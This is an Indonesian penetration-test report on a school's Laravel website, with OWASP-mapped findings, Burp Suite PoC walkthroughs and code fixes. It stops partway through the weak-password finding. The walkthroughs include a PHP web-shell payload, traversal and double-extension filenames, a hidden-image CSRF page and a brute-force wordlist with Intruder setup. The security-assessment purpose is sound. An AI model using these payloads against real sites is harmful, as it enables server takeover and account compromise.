# LAPORAN VAPT OWASP TOP 10

**Objek Penelitian**: Web-SMP-Islam-Baabussalaam  
**Metode**: Code review, manual verification, dan PoC berbasis Burp Suite  
**Fokus**: Asesmen dan mitigasi keamanan aplikasi web berdasarkan OWASP Top 10 2021  
**Tanggal**: 2026-04-07

## 1. Ringkasan Eksekutif

Hasil asesmen terhadap aplikasi Laravel ini menunjukkan sejumlah kerentanan yang dapat divalidasi secara manual dan relevan untuk skenario pengujian menggunakan Burp Suite. Laporan ini hanya memasukkan temuan yang memiliki dasar teknis kuat dan dapat direproduksi pada environment uji berizin.

Secara umum, risiko tertinggi ditemukan pada area:

- file upload yang tidak aman,
- stored XSS dan DOM XSS,
- brute force login tanpa pembatasan,
- aksi perubahan status menggunakan metode GET,
- serta debug mode yang masih aktif.

### Status SQL Injection

Pada target yang dianalisis, **tidak ditemukan SQL Injection yang terkonfirmasi**. Query yang teridentifikasi dominan menggunakan Eloquent ORM atau Query Builder, sehingga negative testing SQLi tetap valid untuk dimasukkan ke laporan sebagai hasil pengujian yang sah.

## 2. Metodologi Validasi Kerentanan

Agar temuan yang dimasukkan benar-benar dapat dipertanggungjawabkan, setiap vulnerability divalidasi dengan kriteria berikut:

1. Dapat direproduksi secara konsisten.
2. Menimbulkan dampak nyata terhadap confidentiality, integrity, atau availability.
3. Memiliki bukti request/response atau perubahan perilaku aplikasi.
4. Dapat diuji menggunakan Burp Suite, browser, atau request manual.

### Jenis Evidence yang Dikumpulkan

| Jenis Evidence    | Contoh                                                                 |
| ----------------- | ---------------------------------------------------------------------- |
| Bukti kode        | Potongan controller, route, atau blade yang menunjukkan sumber masalah |
| HTTP request      | Request hasil intercept dari Burp Proxy / Repeater / Intruder          |
| HTTP response     | Response yang menunjukkan perubahan status, error, atau payload aktif  |
| Dampak visual     | Alert XSS, file upload tersimpan, status data berubah                  |
| Before-after code | Snippet kode sebelum dan sesudah mitigasi                              |

## 3. Ringkasan Temuan

| ID   | Vulnerability                      | OWASP 2021                    | Severity | Bukti Utama                            | Status Validasi |
| ---- | ---------------------------------- | ----------------------------- | -------- | -------------------------------------- | --------------- |
| V-01 | File upload berisiko pada News     | A03 Injection                 | Critical | Upload handler menyimpan filename asli | Valid           |
| V-02 | File upload berisiko pada Teacher  | A03 Injection                 | Critical | Upload handler menyimpan filename asli | Valid           |
| V-03 | File upload berisiko pada Facility | A03 Injection                 | Critical | Upload handler memakai ekstensi asli   | Valid           |
| V-04 | File upload berisiko pada Gallery  | A03 Injection                 | Critical | Upload handler memakai ekstensi asli   | Valid           |
| V-05 | Aksi perubahan status via GET      | A01 / A05                     | High     | Route GET untuk toggle status          | Valid           |
| V-06 | Login brute force tanpa limit      | A07                           | High     | Auth::attempt tanpa rate limit         | Valid           |
| V-07 | Password policy terlalu lemah      | A07                           | Medium   | Min 6 karakter saja                    | Valid           |
| V-08 | Stored XSS pada halaman About      | A03 Injection                 | High     | Output raw `{!! !!}`                   | Valid           |
| V-09 | Stored XSS pada halaman Academic   | A03 Injection                 | High     | Output raw `{!! !!}`                   | Valid           |
| V-10 | DOM XSS pada preview halaman admin | A03 Injection                 | High     | `innerHTML` dari dataset               | Valid           |
| V-11 | DOM XSS pada preview guru/staff    | A03 Injection                 | High     | `innerHTML` dari input user            | Valid           |
| V-12 | DOM XSS pada preview fasilitas     | A03 Injection                 | Medium   | `innerHTML` dari features              | Valid           |
| V-13 | Debug mode aktif                   | A05 Security Misconfiguration | Medium   | `APP_DEBUG=true`                       | Valid           |

## 4. Pembahasan Temuan

### V-01. File Upload Berisiko pada News

**Severity**: Critical  
**OWASP**: A03 Injection

#### Deskripsi Kerentanan

Fitur upload berita menerima file image tetapi menyimpan nama file berdasarkan nama asli user. Pola ini berbahaya karena attacker dapat memanipulasi nama file atau konten file untuk mencoba menaruh file berisiko di webroot publik.

#### Bukti Kode

```php
'image' => 'nullable|image|mimes:jpeg,png,jpg,gif|max:2048',
$filename = time() . '_' . $file->getClientOriginalName();
$file->move(public_path('assets/img/news'), $filename);
```

Lokasi: [app/Http/Controllers/Admin/NewsController.php](app/Http/Controllers/Admin/NewsController.php)

#### Kenapa Ini Valid Vulnerability

- File disimpan ke folder publik.
- Nama file mengikuti input asli user.
- Kontrol ekstensi final tidak dibuat aman dengan UUID dan storage terisolasi.
- Jika server mengizinkan interpretasi file tertentu di folder publik, impact dapat meningkat menjadi code execution.

#### Evidence yang Diambil

- Request multipart upload dari browser/Burp.
- Parameter filename pada multipart request.
- Lokasi penyimpanan file pada folder publik.
- Respons sukses setelah upload.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Siapkan Environment**

- Buka browser dan akses aplikasi di http://localhost:8000
- Login sebagai admin dengan kredensial yang valid
- Buka Burp Suite dan pastikan proxy sudah aktif di browser

**Langkah 2: Akses Halaman Upload Berita**

1. Di browser, navigasi ke halaman admin Management Berita (biasanya di `/admin/berita/create` atau menu yang setara)
2. Siapkan file gambar PNG atau JPG yang akan diunggah
3. Pastikan Burp Proxy Intercept sedang ON (artinya semua request akan di-pause di Burp)

**Langkah 3: Intercept Request Upload**

1. Di form upload berita, isi field yang lain (misalnya judul: "Test Exploit", deskripsi: "Testing")
2. Pilih file gambar dari PC (misal: `test.png`)
3. Klik tombol "Upload" atau "Simpan"
4. Request akan terhenti di Burp (tab Proxy → Intercept)
5. Lihat request yang terlihat seperti:

    ```
    POST /admin/berita HTTP/1.1
    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxxx

    ------WebKitFormBoundaryxxx
    Content-Disposition: form-data; name="image"; filename="test.png"
    Content-Type: image/png

    [binary PNG data]
    ------WebKitFormBoundaryxxx--
    ```

**Langkah 4: Modifikasi Nama File di Multipart**

1. Di tab Interceptor Burp, cari baris yang berisi `filename="test.png"`
2. Ubah menjadi: `filename="shell.php.png"` atau `filename="../../../../shell.php"` atau `filename="test.php%00.png"`
3. Contoh payload nama file berbahaya:
    - `shell.php.png` - Jika server konfigurasi salah, bisa dianggap PHP
    - `test.phtml` - Double extension exploitation
    - `test.php5` atau `test.shtml` - Alternatif ekstensi eksekusi
    - Atau ubah jadi: `../../public/shell.php` untuk path traversal

**Langkah 5: Kirim Request yang Sudah Dimodifikasi**

1. Klik "Forward" di Burp Interceptor untuk mengirim request
2. Di response (di tab Response), Anda akan melihat status 200 atau redirect jika sukses
3. Burp akan menampilkan sesuatu seperti:
    ```
    HTTP/1.1 302 Found
    Location: /admin/berita
    ```

**Langkah 6: Verifikasi File Tersimpan dengan Akses Langsung**

1. Buka tab baru di browser
2. Navigasi ke folder publik: `http://localhost:8000/assets/img/news/`
3. Cari file yang baru diunggah. Jika Anda menggunakan `shell.php.png`, maka file akan tersimpan dengan nama itu
4. File akan terlihat di listing folder publik jika server tidak melindungi folder
5. Url akan terlihat seperti: `http://localhost:8000/assets/img/news/1712500000_shell.php.png`

**Langkah 7: Testing Alternative - Burp Repeater**

1. Jika ingin testing berkali-kali tanpa perlu upload ulang dari form, gunakan Repeater
2. Buat request multipart secara manual di Repeater:

    ```
    POST /admin/berita HTTP/1.1
    Host: localhost:8000
    Content-Type: multipart/form-data; boundary=----WebKitBoundary

    ------WebKitBoundary
    Content-Disposition: form-data; name="title"

    Test Upload
    ------WebKitBoundary
    Content-Disposition: form-data; name="description"

    Testing upload
    ------WebKitBoundary
    Content-Disposition: form-data; name="image"; filename="payload.php.png"
    Content-Type: image/png

    [minimal PNG binary atau text: PNG signature]
    ------WebKitBoundary--
    ```

3. Klik "Send" dan lihat apakah file berhasil tersimpan

**Langkah 8: Buktikan Vulnerabilitas**

- File berbahaya berhasil tersimpan di folder publik dengan nama yang bisa dimanipulasi
- Tidak ada UUID atau randomization yang aman
- Filename asli dari user (atau modifikasi user) tersimpan apa adanya
- Ini membuktikan V-01 valid: attacker bisa menyimpan file dengan nama berbahaya yang bisa mengecoh admin atau exploit konfigurasi server yang lemah

#### Dampak Jika Dibiarkan

- Penyerang dapat menaruh file berbahaya pada direktori publik.
- Dapat membuka jalan ke XSS tersimpan atau eksekusi file bila konfigurasi server lemah.
- Risiko integritas file media menjadi tinggi.

#### Mitigasi Before-After

Before:

```php
$filename = time() . '_' . $file->getClientOriginalName();
$file->move(public_path('assets/img/news'), $filename);
```

After:

```php
use Illuminate\Support\Str;

$filename = Str::uuid()->toString() . '.' . $file->extension();
$file->storeAs('news', $filename, 'public');
```

### V-02. File Upload Berisiko pada Teacher

**Severity**: Critical  
**OWASP**: A03 Injection

#### Deskripsi Kerentanan

Upload foto guru/staff juga menyimpan file memakai nama asli user. Ini memperbesar risiko file berbahaya masuk ke webroot publik.

#### Bukti Kode

```php
'photo' => 'nullable|image|mimes:jpeg,png,jpg|max:2048',
$filename = time() . '_' . $file->getClientOriginalName();
$file->move(public_path('assets/img/teachers'), $filename);
```

Lokasi: [app/Http/Controllers/Admin/TeacherController.php](app/Http/Controllers/Admin/TeacherController.php)

#### Kenapa Ini Valid Vulnerability

- File disimpan langsung di public path.
- Nama file tidak dinormalisasi.
- Kontrol whitelist ekstensi akhir tidak kuat.

#### Evidence yang Diambil

- Multipart request upload foto.
- Nama file asli di request.
- File berhasil disimpan di direktori publik.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Navigasi ke Halaman Upload Foto Guru**

1. Login ke admin panel
2. Ke menu Management Guru/Staff (typically `/admin/guru/create` atau form edit guru)
3. Pastikan Burp Suite Proxy Intercept sudah aktif (Intercept is ON)

**Langkah 2: Upload dengan Interceptor Aktif**

1. Isi field guru: nama ("Budi Santoso"), mata pelajaran, dsb
2. Upload file foto (misal: `teacher.jpg`)
3. Klik "Simpan" atau "Upload"
4. Request akan terhenti di Burp → Proxy → Intercept
5. Lihat multipart form dengan field:
    ```
    Content-Disposition: form-data; name="photo"; filename="teacher.jpg"
    Content-Type: image/jpeg
    ```

**Langkah 3: Manipulasi Filename**

1. Di Burp Interceptor, temukan baris `filename="teacher.jpg"`
2. Ubah menjadi `filename="teacher.php.jpg"` (double extension)
3. Atau: `filename="../../../shell.jpg"` (path traversal)
4. Atau: `filename="teacher%00.php.jpg"` (null byte inject)
5. Cek kode asli: `$filename = time() . '_' . $file->getClientOriginalName();` maka nama file akan menjadi sesuatu seperti `1712500123_teacher.php.jpg`

**Langkah 4: Kirim Request**

1. Klik "Forward" di Burp
2. Tunggu response berhasil (302 redirect atau 200)

**Langkah 5: Verifikasi di Folder Publik**

1. Buka URL folder: `http://localhost:8000/assets/img/teachers/`
2. Lihat file baru dengan nama yang sudah dimodifikasi seperti `1712500123_teacher.php.jpg`
3. File berhasil disimpan dengan nama yang bisa dimanipulasi attacker

**Langkah 6: Testing Multiple Upload**

- Upload beberapa file dengan nama berbeda untuk membuktikan pattern yang konsisten
- Contoh: `malicious.png.jpg`, `backdoor.jpg.php`, `test.exe.jpg`
- Semua akan tersimpan dengan nama sesuai input user tanpa sanitasi

**Hasil**: File teacher berhasil diunggah ke publik dengan nama yang bisa dimanipulasi. Ini sama dengan V-01 - tidak ada UUID, tidak ada safer storage, hanya `time()` + nama file asli.

#### Dampak Jika Dibiarkan

- File media dapat dipakai untuk attack chaining.
- Potensi penyalahgunaan file publik untuk payload berbahaya.
- Risiko reputasi dan integritas data meningkat.

#### Mitigasi Before-After

Before:

```php
$filename = time() . '_' . $file->getClientOriginalName();
$file->move(public_path('assets/img/teachers'), $filename);
```

After:

```php
use Illuminate\Support\Str;

$filename = Str::uuid()->toString() . '.' . $file->extension();
$file->storeAs('teachers', $filename, 'public');
```

### V-03. File Upload Berisiko pada Facility

**Severity**: Critical  
**OWASP**: A03 Injection

#### Deskripsi Kerentanan

Fitur upload fasilitas memakai ekstensi asli dari file yang diunggah. Ini membuka risiko file berbahaya tersimpan di direktori publik.

#### Bukti Kode

```php
'image' => 'nullable|image|max:2048'
$imageName = time() . '_' . uniqid() . '.' . $image->getClientOriginalExtension();
$image->move(public_path('assets/img/facilities'), $imageName);
```

Lokasi: [app/Http/Controllers/Admin/FacilityController.php](app/Http/Controllers/Admin/FacilityController.php)

#### Kenapa Ini Valid Vulnerability

- Ekstensi akhir diturunkan dari input user.
- File disimpan pada folder yang dapat diakses publik.
- Tidak ada pemisahan storage yang aman.

#### Evidence yang Diambil

- Request upload fasilitas.
- Parameter file dan ekstensi.
- Hasil file tersimpan pada folder publik.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Setup**

1. Login admin, navigasi ke Management Fasilitas (`/admin/fasilitas/create`)
2. Aktifkan Burp Proxy Intercept

**Langkah 2: Upload dengan Intercept**

1. Isi field fasilitas: nama ("Lapangan Olahraga"), deskripsi, dsb
2. Pilih file gambar (misal: `field.jpg`)
3. Klik submit → request akan di-pause Burp

**Langkah 3: Identifikasi Bagian Multipart yang Rentan**

1. Di Burp Interceptor, lihat request:
    ```
    Content-Disposition: form-data; name="image"; filename="field.jpg"
    Content-Type: image/jpeg
    ```
2. Kode vulnerable: `$image->getClientOriginalExtension()` artinya ekstension langsung diambil dari input
3. Nama file dalam kode: `time() . '_' . uniqid() . '.' . $image->getClientOriginalExtension()`

**Langkah 4: Manipulasi Ekstension**

1. Edit baris `filename="field.jpg"` menjadi `filename="field.php"` (ubah extension ke .php)
2. Atau: `filename="field.phtml"` (.phtml file bisa dieksekusi di beberapa server)
3. Atau: `filename="field.jpg.php"` (double extension)

**Langkah 5: Forward dan Verifikasi**

1. Kirim request ("Forward")
2. Navigasi ke `http://localhost:8000/assets/img/facilities/`
3. Lihat file dengan nama seperti: `1712500000_5abc12cd.php` (extensi berhasil di-preserve dari input)

**Langkah 6: Testing Ekstension Berbeda**

- Upload ulang dengan berbagai ekstension: `.php`, `.phtml`, `.shtml`, `.sh`, `.asp`, `.aspx`
- Semua akan tersimpan sesuai input user karena `getClientOriginalExtension()` tidak ada whitelist ekstension output
- Kode hanya ada validasi input (mimes) tapi tidak ada kontrol ekstension output

**Hasil**: Ekstension file output bergantung pada input user, membuktikan V-03 valid - extensi asli user dipake untuk output file.

#### Dampak Jika Dibiarkan

- Pengunggahan file berbahaya menjadi lebih mudah.
- Folder publik menjadi surface serangan.
- Bisa memicu stored attack lanjutan.

#### Mitigasi Before-After

Before:

```php
$imageName = time() . '_' . uniqid() . '.' . $image->getClientOriginalExtension();
$image->move(public_path('assets/img/facilities'), $imageName);
```

After:

```php
use Illuminate\Support\Str;

$imageName = Str::uuid()->toString() . '.' . $image->extension();
$image->storeAs('facilities', $imageName, 'public');
```

### V-04. File Upload Berisiko pada Gallery

**Severity**: Critical  
**OWASP**: A03 Injection

#### Deskripsi Kerentanan

Upload galeri memakai ekstensi asli dan menyimpan file ke public directory.

#### Bukti Kode

```php
'image' => 'required|image|max:2048'
$imageName = time() . '_' . uniqid() . '.' . $image->getClientOriginalExtension();
$image->move(public_path('assets/img/gallery'), $imageName);
```

Lokasi: [app/Http/Controllers/Admin/GalleryController.php](app/Http/Controllers/Admin/GalleryController.php)

#### Kenapa Ini Valid Vulnerability

- File upload diterima langsung dari user.
- File disimpan ke webroot publik.
- Validasi belum cukup untuk mencegah attack chaining.

#### Evidence yang Diambil

- Request upload galeri.
- Response sukses.
- File tersimpan pada folder publik.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Akses Halaman Gallery Upload**

1. Login admin, go to Management Galeri (`/admin/gallery/create` atau form upload galeri)
2. Aktifkan Burp Interceptor

**Langkah 2: Siapkan Upload**

1. Isi field galeri yang diperlukan (judul, deskripsi, dll)
2. Pilih file gambar (misal: `photo.jpg`)
3. Klik tombol upload/submit
4. Request akan ter-pause di Burp

**Langkah 3: Analisis Multipart Request**

1. Di Burp Interceptor, lihat:

    ```
    POST /admin/gallery HTTP/1.1
    Content-Type: multipart/form-data; boundary=----WebKit...

    ------WebKit...
    Content-Disposition: form-data; name="image"; filename="photo.jpg"
    Content-Type: image/jpeg
    [binary data]
    ```

2. Kode vulnerable:
    ```php
    $imageName = time() . '_' . uniqid() . '.' . $image->getClientOriginalExtension();
    $image->move(public_path('assets/img/gallery'), $imageName);
    ```

**Langkah 4: Manipulasi File**

1. Ubah `filename="photo.jpg"` → `filename="exploit.php"`
2. Atau: `filename="backdoor.php.jpg"` (untuk double ext)
3. Atau ubah Content-Type dari `image/jpeg` menjadi `application/x-php` (meski validasi input akan cek, perubahan dalam multipart bisa test koercion)

**Langkah 5: Alter Binary Data (Optional Testing)**

1. Edit bagian binary data file jika ingin test image validation
2. Tambahkan atau ganti sebagian dengan text payload: `<?php system($_GET['cmd']); ?>`
3. Ini akan menguji apakah server benar-benar validate magic bytes atau hanya validate extension

**Langkah 6: Forward dan Observe**

1. Klik "Forward" di Burp
2. Response akan menunjukkan redirect atau success
3. Navigasi ke `http://localhost:8000/assets/img/gallery/`
4. Lihat file tersimpan dengan nama seperti: `1712600000_aabbccdd.php` (jika extension diubah ke `.php`)

**Langkah 7: Test Konsistensi**

- Upload berulang dengan extension berbeda
- Buktikan bahwa extension output selalu mengikuti input user
- Tidak ada UUID atau sanitasi ekstension output
- Ini membuktikan V-04 - gallery upload sama seperti news, teacher, facility dalam hal manipulasi filename/extension

**Hasil**: File galeri bisa diunggah dengan extension berbahaya, tersimpan di publik folder dengan nama manipulasi dari user.

#### Dampak Jika Dibiarkan

- Risiko penyalahgunaan file publik.
- Potensi stored payload di media server.
- Integritas konten galeri terganggu.

#### Mitigasi Before-After

Before:

```php
$imageName = time() . '_' . uniqid() . '.' . $image->getClientOriginalExtension();
$image->move(public_path('assets/img/gallery'), $imageName);
```

After:

```php
use Illuminate\Support\Str;

$imageName = Str::uuid()->toString() . '.' . $image->extension();
$image->storeAs('gallery', $imageName, 'public');
```

### V-05. State-Changing Action via GET pada Toggle Status Berita

**Severity**: High  
**OWASP**: A01 Broken Access Control / A05 Security Misconfiguration

#### Deskripsi Kerentanan

Perubahan status berita dilakukan memakai metode GET. Ini tidak sesuai prinsip keamanan karena aksi yang mengubah state seharusnya memakai POST/PUT/DELETE dengan CSRF token.

#### Bukti Kode

```php
Route::get('/berita/{id}/toggle-status', [NewsController::class, 'toggleStatus'])->name('admin.berita.toggle');
```

Lokasi: [routes/web.php](routes/web.php)

#### Kenapa Ini Valid Vulnerability

- GET tidak semestinya dipakai untuk aksi perubahan data.
- Dapat dipicu tanpa form CSRF.
- Mudah ditrigger melalui request browser biasa.

#### Evidence yang Diambil

- Route GET pada file route.
- Request perubahan status berita.
- Perubahan status yang terjadi setelah request.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Identifikasi Endpoint GET yang Rentan**

1. Login ke admin panel sebagai user dengan akses ke management berita
2. Asumsikan ada berita dengan ID 5 (atau lihat dari URL halaman list berita)
3. Aktifkan Burp Proxy Intercept

**Langkah 2: Akses Halaman List Berita**

1. Navigasi ke list berita, misalnya `/admin/berita`
2. Di halaman ini, Anda akan melihat list semua berita dengan tombol "Toggle Status" atau "Aktifkan/Nonaktifkan"
3. Status berita mungkin ditampilkan sebagai "Aktif" atau "Nonaktif"

**Langkah 3: Intercept Toggle Status Request**

1. Klik tombol toggle status untuk salah satu berita (misalnya berita dengan judul "Pemberitahuan Penting")
2. Di Burp Interceptor, Anda akan melihat request GET seperti:
    ```
    GET /admin/berita/5/toggle-status HTTP/1.1
    Host: localhost:8000
    Cookie: XSRF-TOKEN=xxx; laravel_session=yyy
    ```
3. Notice: Request adalah GET, bukan POST
4. Notice: Tidak ada parameter CSRF token di request (atau ada tapi tidak di-validate karena GET)

**Langkah 4: Ekstrak URL GET untuk CSRF**

1. Copy URL endpoint: `/admin/berita/5/toggle-status`
2. URL lengkap: `http://localhost:8000/admin/berita/5/toggle-status`
3. Ini adalah URL yang bisa di-trigger cukup dengan mengakses URL saja (GET request)

**Langkah 5: Testing CSRF via Simple Link**

1. Buka text editor dan buat file HTML sederhana:
    ```html
    <html>
        <body>
            <h1>Test CSRF</h1>
            <p>Klik link di bawah ini saat sudah login ke aplikasi:</p>
            <a href="http://localhost:8000/admin/berita/5/toggle-status"
                >Click here</a
            >
        </body>
    </html>
    ```
2. Simpan sebagai `csrf_test.html`
3. Buka file ini di browser YANG SAMA (dimana sudah login ke aplikasi)
4. Klik link - status berita akan berubah TANPA warning CSRF
5. Buktikan ini: Cek di halaman list berita, status berita sudah berubah

**Langkah 6: Testing CSRF via IMG Tag (Silent Attack)**

1. Buat HTML file baru:
    ```html
    <html>
        <body>
            <h1>Halaman Biasa</h1>
            <p>Halaman ini terlihat normal...</p>
            <!-- Hidden CSRF Attack -->
            <img
                src="http://localhost:8000/admin/berita/5/toggle-status"
                style="display:none;"
            />
        </body>
    </html>
    ```
2. Buka file ini saat sudah login ke aplikasi
3. Browser akan otomatis load img tag (termasuk cookie session)
4. Status berita akan berkubah TANPA user tahu (silent attack)
5. Verifikasi: Lihat di halaman list berita apakah status sudah berubah

**Langkah 7: Testing via Burp Repeater (Multiple Times)**

1. Di Burp Repeater, gunakan request GET yang sudah di-intercept sebelumnya
2. Modify URL untuk test berbagai berita:
    - `GET /admin/berita/5/toggle-status` → Status berita 5 berubah
    - `GET /admin/berita/6/toggle-status` → Status berita 6 berubah
    - `GET /admin/berita/1/toggle-status` → Status berita 1 berubah
3. Setiap klik Send, status akan berubah
4. Tidak ada peringatan atau error CSRF

**Langkah 8: Bandingkan dengan Method POST (Mitigasi)**

1. Seharusnya endpoint adalah:
    ```
    POST /admin/berita/5/toggle-status
    ```
    Bukan GET
2. Dengan POST, browser akan meminta form submission
3. Jika CSRF token divalidasi dengan benar, request lintas situs akan ditolak

**Hasil**:

- Endpoint toggle status bisa di-trigger dengan GET request biasa
- Tidak ada CSRF protection (atau protection tidak effective untuk GET)
- Attacker bisa membuat link/img tag untuk silently mengubah status berita tanpa persetujuan user
- V-05 terbukti valid: GET method untuk aksi yang mengubah state = CSRF vulnerability

#### Dampak Jika Dibiarkan

- Aksi perubahan data dapat dipicu lintas halaman.
- Integritas konten berita bisa dimanipulasi.
- Pengguna sah dapat menjadi korban request tak sengaja.

#### Mitigasi Before-After

Before:

```php
Route::get('/berita/{id}/toggle-status', [NewsController::class, 'toggleStatus'])->name('admin.berita.toggle');
```

After:

```php
Route::post('/berita/{id}/toggle-status', [NewsController::class, 'toggleStatus'])->name('admin.berita.toggle');
```

Contoh view:

```blade
<form method="POST" action="{{ route('admin.berita.toggle', $n->id) }}">
    @csrf
    <button type="submit" class="btn btn-sm btn-secondary">Toggle</button>
</form>
```

### V-06. Login Brute Force Tanpa Rate Limiting

**Severity**: High  
**OWASP**: A07 Identification and Authentication Failures

#### Deskripsi Kerentanan

Proses login tidak memiliki pembatasan percobaan login, sehingga brute force atau password spraying masih memungkinkan.

#### Bukti Kode

```php
$credentials = $request->validate([
    'username' => 'required',
    'password' => 'required',
]);

if (Auth::attempt($credentials, $request->filled('remember'))) {
```

Lokasi: [app/Http/Controllers/AuthController.php](app/Http/Controllers/AuthController.php)

#### Kenapa Ini Valid Vulnerability

- Tidak ada rate limit.
- Tidak ada lockout setelah beberapa gagal login.
- Tidak ada CAPTCHA atau mekanisme throttling lainnya.

#### Evidence yang Diambil

- Request login berulang di Burp Intruder.
- Tidak ada 429 atau lockout message.
- Pola respons tetap konsisten.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Akses Halaman Login**

1. Buka aplikasi di `http://localhost:8000` atau akses halaman login admin
2. Pastikan sudah logout terlebih dahulu
3. Halaman login akan menampilkan field untuk username dan password

**Langkah 2: Intercept Single Login Request**

1. Login ke halaman dengan credential salah saja (misal: username="admin", password="salah123")
2. Klik tombol Login
3. Di Burp Interceptor, tangkap request POST:

    ```
    POST /login HTTP/1.1
    Host: localhost:8000
    Content-Type: application/x-www-form-urlencoded

    username=admin&password=salah123
    ```

4. Lihat response yang akan menunjukkan "Invalid credentials" atau sejenisnya
5. Notice: Response code adalah 200 atau 302 (redirect ke login lagi), tidak ada 429 (rate limit)

**Langkah 3: Buat Wordlist untuk Brute Force**

1. Buat file `passwords.txt` dengan daftar password yang ingin dicoba:
    ```
    password123
    admin123
    123456
    password
    admin
    test123
    letmein
    qwerty
    welcome
    12345678
    1234567
    ```
2. Simpan file ini untuk digunakan di Intruder

**Langkah 4: Setup Burp Intruder**

1. Di Burp, ambil request POST login dari Repeater bila sudah ada, atau intercept lagi
2. Klik kanan pada request → "Send to Intruder"
3. Di tab Intruder, Anda akan melihat request login

**Langkah 5: Konfigurasi Intruder Attack**

1. Di tab "Positions", Burp sudah auto-highlight parameter fields
2. Clear semua positions dengan klik "Clear §"
3. Hanya highlight password field: `password=salah123`
4. Sorot "salah123" dan klik tombol "Add §" untuk membuat position `password=§salah123§`
5. Di dropdown "Attack type", pilih "Sniper" (optimal untuk single parameter)

**Langkah 6: Load Wordlist**

1. Click tab "Payloads"
2. Di "Payload type", pilih "Simple list"
3. Klik "Load" dan pilih file `passwords.txt` yang sudah dibuat
4. Anda akan melihat semua password dalam list ditampilkan

**Langkah 7: Konfigurasi Response Matching**

1. Optional: Di tab "Settings", scroll ke bawah cari "Grep - Match"
2. Tambahkan string yang muncul saat login sukses atau gagal
3. Misal: grep "Invalid credentials" untuk yang TIDAK cocok, atau "Dashboard" untuk yang sukses
4. Ini akan memudahkan identify saat password benar ditemukan

**Langkah 8: Jalankan Attack**

1. Klik "Start attack" / "Start" button di Intruder
2. Burp akan mulai mengirim request login dengan setiap password dari wordlist
3. Lihat di response area - Anda akan melihat list request dengan response time dan status
4. Cari response yang berbeda:
    - Jika password salah: response menunjukkan "Invalid credentials", status code 200
    - Jika password benar: response menampilkan dashboard atau redirect ke URL lain, status code 302
5. Response time untuk password benar mungkin sedikit berbeda (lebih cepat karena berhasil)

**Langkah 9: Identifikasi Password Sukses**

1. Cari response yang tidak menunjukkan error message
2. Response yang memiliki redirect location berbeda (bukan kembali ke login page)
3. Response yang menampilkan string "Dashboard" atau sejenisnya
4. Contoh response sukses:
    ```
    HTTP/1.1 302 Found
    Location: /admin/dashboard
    Set-Cookie: laravel_session=xxxnewsessionxxx
    ```

**Langkah 10: Buktikan Tidak Ada Rate Limiting**

1. Jalankan Intruder attack berkali-kali (bisa 2-3 kali full scan)
2. Tidak akan menerima response 429 (Too Many Requests)
3. Tidak ada informasi "akun terkunci" atau "coba lagi nanti"
4. Sistem tetap menerima request login tanpa batas

**Langkah 11: Testing Multiple Username**

1. Jika ingin lebih agresif, bisa juga setup Intruder dengan 2 position: username & password
2. Attack type: "Cartesian"
3. Load wordlist user (admin, root, test) dan password list
4. System akan brute force kombinasi semua username × password
5. Ini menunjukkan exposure lebih besar untuk akses terlebih dahulu

**Langkah 12: Alternative - Manual Burp Repeater Testing**

1. Jika tidak ingin setup Intruder kompleks, bisa pakai Repeater
2. Copy request login ke Repeater tab
3. Ubah password manually setiap kali: `password=password1` → Send
4. Ubah lagi: `password=password2` → Send
5. Ulangi hingga menemukan yang bekerja
6. Ini lebih lambat tapi menunjukkan vulnerability sama jelas

**Hasil**:

- Tidak ada pembatasan jumlah percobaan login
- Sistem tidak menimpa rate limiting atau account lockout
- Setiap request login dengan password salah tetap diproses langsung
- Brute force attack bisa dilakukan hingga password ketemu
- V-06 terbukti valid: Sistem rentan terhadap brute force login

#### Dampak Jika Dibiarkan

- Akun admin dapat ditebak melalui brute force.
- Kerahasiaan data dan akses admin terancam.
- Serangan password spraying menjadi lebih mudah.

#### Mitigasi Before-After

Before:

```php
if (Auth::attempt($credentials, $request->filled('remember'))) {
```

After:

```php
use Illuminate\Support\Facades\RateLimiter;

$key = strtolower($request->input('username')) . '|' . $request->ip();
if (RateLimiter::tooManyAttempts($key, 5)) {
    return back()->withErrors(['username' => 'Terlalu banyak percobaan login.']);
}
```

### V-07. Kebijakan Password Lemah

**Severity**: Medium  
**OWASP**: A07 Identification and Authentication Failures

#### Deskripsi Kerentanan

Sistem hanya memaksa password minimal 6 karakter. Ini terlalu lemah untuk akun administratif atau akun pengguna yang mengelola data sensitif.

#### Bukti Kode

```php
'password' => 'required|min:6',
```

Lokasi: [app/Http/Controllers/Admin/UserController.php](app/Http/Controllers/Admin/UserController.php)

#### Kenapa Ini Valid Vulnerability

- Password pendek lebih mudah ditebak.
- Tidak ada kompleksitas karakter.
- Memperbesar risiko credential stuffing dan brute force.

#### Evidence yang Diambil

- Payload create user dengan password sederhana.
- Request tetap diterima.
- Akun dapat dibuat dengan password lemah.

#### PoC Burp Suite - Tutorial Lengkap

**Langkah 1: Akses Halaman Manajemen User**

1. Login sebagai admin
2. Navigasi ke Management User atau Create User page (`/admin/users/create`)
3. Aktifkan Burp Proxy Intercept

**Langkah 2: Siapkan Form Pembuatan User Baru**

1. Di form, isi field-field yang diperlukan:
    - Username: "testuser"
    - Email: "test@school.com"
    - Role: "Teacher" atau role yang tersedia
2. Untuk field password, masukkan password yang LEMAH: "123456"
3. Confirm password: "123456"
4. Klik tombol "Create User" atau "Simpan"

**Langkah 3: Intercept Request di Burp**

1. Request akan ter-pause di Burp Interceptor
2. Lihat request POST:

    ```
    POST /admin/users HTTP/1.1
    Host: localhost:8000
    Content-Type: application/x-www-form-urlencoded

    username=testuser&email=test@school.com&password=123456&password_confirmation=123456&role=teacher
    ```

**Langkah 4: Kirim Request Apa Adanya**

1. Klik "Forward" di Burp tanpa mengubah apa-apa
2. Response akan menunjukkan success:
    ```
    HTTP/1.1 302 Found
    Location: /admin/users
    ```
3. User berhasil dibuat dengan password hanya 6 karakter!

**Langkah 5: Verifikasi User Berhasil Dibuat**

1. Buka halaman list user: `/admin/users`
2. Lihat user baru "testuser" dalam list
3. Tidak ada warning atau error tentang password lemah

**Langkah 6: Test Password Lemah Berbeda**

1. Coba buat user lagi dengan password lebih pendek:
    - "12345" (5 karakter)
    - "abc" (3 karakter)
    - "1" (1 karakter)
2. Repeat langkah interception dan forward
